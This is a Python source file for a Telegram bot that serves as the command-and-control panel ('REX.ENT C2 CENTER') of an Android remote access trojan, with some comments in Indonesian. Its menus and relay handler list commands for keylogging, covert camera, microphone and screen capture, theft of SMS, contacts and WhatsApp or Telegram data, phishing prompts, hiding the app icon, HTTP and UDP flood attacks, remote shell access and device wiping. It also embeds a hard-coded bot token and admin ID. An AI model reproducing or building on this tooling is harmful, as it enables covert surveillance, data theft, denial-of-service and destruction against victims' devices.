import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import BadRequest

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = "8739367697:AAELUfIpX0mU3rcokQQiAywGYMhvpj2ickg"
ADMIN_CHAT_ID = 8601209747

# ── Menu utama ─────────────────────────────────────────────
MAIN_MENU = [
    [InlineKeyboardButton("📁 File Manager", callback_data="tab_file")],
    [InlineKeyboardButton("📍 Location", callback_data="tab_loc"), InlineKeyboardButton("💬 SMS/Calls", callback_data="tab_sms")],
    [InlineKeyboardButton("📷 Camera", callback_data="tab_cam"), InlineKeyboardButton("🎙 Audio", callback_data="tab_aud")],
    [InlineKeyboardButton("🖥 Screen", callback_data="tab_scr"), InlineKeyboardButton("⌨ Keylogger", callback_data="tab_key")],
    [InlineKeyboardButton("📱 Device Info", callback_data="tab_dev"), InlineKeyboardButton("📋 Clipboard", callback_data="tab_clip")],
    [InlineKeyboardButton("🔔 Notifications", callback_data="tab_notif"), InlineKeyboardButton("📦 Stealer", callback_data="tab_steal")],
    [InlineKeyboardButton("🌐 Network / DoS", callback_data="tab_net"), InlineKeyboardButton("⚙ Shell", callback_data="tab_shell")],
    [InlineKeyboardButton("🛡 System", callback_data="tab_sys"), InlineKeyboardButton("💣 Destroy", callback_data="tab_destroy")],
    [InlineKeyboardButton("🆔 Set Active Session", callback_data="set_session")],
]

SESSION_MENU = [
    [InlineKeyboardButton("ALL (all devices)", callback_data="sess_ALL")],
    [InlineKeyboardButton("SESSION_XXXX (input manual)", callback_data="sess_manual")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
]

TAB_COMMANDS = {
    "tab_file": ["/ls [SESSION] /sdcard", "/download [SESSION] /sdcard/Download/file.txt", "/rm [SESSION] /sdcard/file.txt", "/rename [SESSION] /old /new"],
    "tab_loc": ["/location [SESSION]", "/gps [SESSION]"],
    "tab_sms": ["/sms_list [SESSION] 20", "/sendsms [SESSION] 0812xxxx 'Hello'", "/delsms [SESSION] 1", "/calls [SESSION] 30", "/contacts [SESSION]"],
    "tab_cam": ["/photo_front [SESSION]", "/photo_back [SESSION]", "/record [SESSION] 15"],
    "tab_aud": ["/mic [SESSION] 30", "/liveaudio [SESSION]"],
    "tab_scr": ["/screenshot [SESSION]", "/screenrecord [SESSION] 30"],
    "tab_key": ["/keylog_start [SESSION]", "/keylog_dump [SESSION]", "/keylog_stop [SESSION]"],
    "tab_dev": ["/info [SESSION]", "/apps [SESSION]", "/battery [SESSION]", "/network [SESSION]", "/permissions [SESSION]"],
    "tab_clip": ["/clipboard [SESSION]", "/setclip [SESSION] HelloWorld"],
    "tab_notif": ["/notif [SESSION]", "/fakenotif [SESSION] Test Hello"],
    "tab_steal": ["/steal_images [SESSION]", "/steal_docs [SESSION]", "/extract_wa [SESSION]", "/extract_tg [SESSION]"],
    "tab_net": ["/httpflood [SESSION] http://target.com 50", "/udpflood [SESSION] 1.2.3.4 53 30"],
    "tab_shell": ["/shell [SESSION] ls -la", "/sush [SESSION] id"],
    "tab_sys": ["/openurl [SESSION] https://google.com", "/toast [SESSION] hacked", "/phish [SESSION] Google Verify", "/vibrate [SESSION] 2000", "/playsound [SESSION]", "/lock [SESSION]", "/hideicon [SESSION]", "/autostart [SESSION]"],
    "tab_destroy": ["/wipe [SESSION]", "/destroy [SESSION]"],
}

# ── session management ─────────────────────────────────────
def get_active_session(context: ContextTypes.DEFAULT_TYPE) -> str:
    return context.user_data.get("active_session", "ALL")

def set_active_session(context: ContextTypes.DEFAULT_TYPE, session: str):
    context.user_data["active_session"] = session.upper()

# ── error handler ──────────────────────────────────────────
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    if isinstance(context.error, BadRequest) and "not modified" in str(context.error).lower():
        return
    logger.error(f"Update {update} caused error: {context.error}")

# ── command: start ─────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    active = get_active_session(context)
    await update.message.reply_text(
        "🔰 <b>REX.ENT C2 CENTER</b>\n"
        f"<b>Active target:</b> <code>{active}</code>\n\n"
        "Select a tab to see available commands.\n"
        "Change target with <code>/session SESSION_ID</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(MAIN_MENU)
    )

# ── command: /session ──────────────────────────────────────
async def set_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    parts = update.message.text.strip().split()
    if len(parts) >= 2:
        set_active_session(context, parts[1])
        await update.message.reply_text(f"✅ Active session set to <code>{parts[1].upper()}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("Usage: <code>/session SESSION_ID</code>", parse_mode=ParseMode.HTML)

# ── callback handler (tabs & session menu) ─────────────────
async def tab_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "set_session":
        active = get_active_session(context)
        await query.edit_message_text(
            f"<b>Select target session</b> (current: <code>{active}</code>)\n"
            "Or type <code>/session SESSION_ID</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(SESSION_MENU)
        )
        return

    if data.startswith("sess_"):
        if data == "sess_ALL":
            set_active_session(context, "ALL")
        elif data == "sess_manual":
            await query.edit_message_text(
                "Type the session ID after <code>/session</code>:\n<code>/session SESSION_12345</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(MAIN_MENU)
            )
            return
        active = get_active_session(context)
        await query.edit_message_text(
            f"✅ Active target set to <code>{active}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(MAIN_MENU)
        )
        return

    if data == "back_main":
        await query.edit_message_text(
            "Select a tab:",
            reply_markup=InlineKeyboardMarkup(MAIN_MENU)
        )
        return

    if data in TAB_COMMANDS:
        active = get_active_session(context)
        commands = TAB_COMMANDS[data]
        rendered = [c.replace("[SESSION]", active) for c in commands]
        txt = f"📌 <b>{data.replace('tab_','').upper()}</b> (target: <code>{active}</code>)\n\n"
        txt += "\n".join(f"<code>{c}</code>" for c in rendered)
        await query.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(MAIN_MENU))
        return

    # fallback
    await query.edit_message_text("Unknown action.", reply_markup=InlineKeyboardMarkup(MAIN_MENU))

# ── relay semua perintah dari user ke device ───────────────
async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    cmd = update.message.text.strip()
    logger.info(f"Relaying: {cmd}")

    # daftar perintah yang butuh target sesi
    need_target = {
        "/ls","/download","/rm","/rename","/sms_list","/sendsms","/delsms",
        "/calls","/contacts","/location","/gps","/photo_front","/photo_back",
        "/record","/mic","/liveaudio","/screenshot","/screenrecord",
        "/keylog_start","/keylog_stop","/keylog_dump","/info","/apps",
        "/battery","/network","/permissions","/clipboard","/setclip",
        "/notif","/fakenotif","/steal_images","/steal_docs","/extract_wa",
        "/extract_tg","/httpflood","/udpflood","/shell","/sush","/openurl",
        "/toast","/phish","/vibrate","/playsound","/lock","/wipe","/destroy",
        "/hideicon","/autostart","/socmed"
    }

    parts = cmd.split()
    if parts and parts[0].lower() in need_target:
        # jika user belum menyertakan target, sisipkan sesi aktif
        if len(parts) < 2 or not (parts[1].startswith("SESSION_") or parts[1].upper() == "ALL"):
            active = get_active_session(context)
            parts.insert(1, active)
            cmd = " ".join(parts)
            logger.info(f"Auto-inserted session: {cmd}")

    await update.message.reply_text(
        f"📤 <b>Sent:</b> <code>{cmd}</code>\n<i>Awaiting device...</i>",
        parse_mode=ParseMode.HTML
    )

# ── main ───────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("session", set_session_cmd))
    app.add_handler(CallbackQueryHandler(tab_handler))

    # daftar command yang sama dengan need_target + /start + /session
    all_commands = [
        "info","ls","download","rm","rename","sms_list","sendsms","delsms",
        "calls","contacts","location","gps","photo_front","photo_back",
        "record","mic","liveaudio","screenshot","screenrecord",
        "keylog_start","keylog_stop","keylog_dump","apps","battery",
        "network","permissions","clipboard","setclip","notif","fakenotif",
        "steal_images","steal_docs","extract_wa","extract_tg",
        "httpflood","udpflood","shell","sush","openurl","toast","phish",
        "vibrate","playsound","lock","wipe","destroy","hideicon","autostart","socmed"
    ]
    app.add_handler(CommandHandler(all_commands, relay))

    logger.info("Bot started – full tab menu + multi‑session active")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
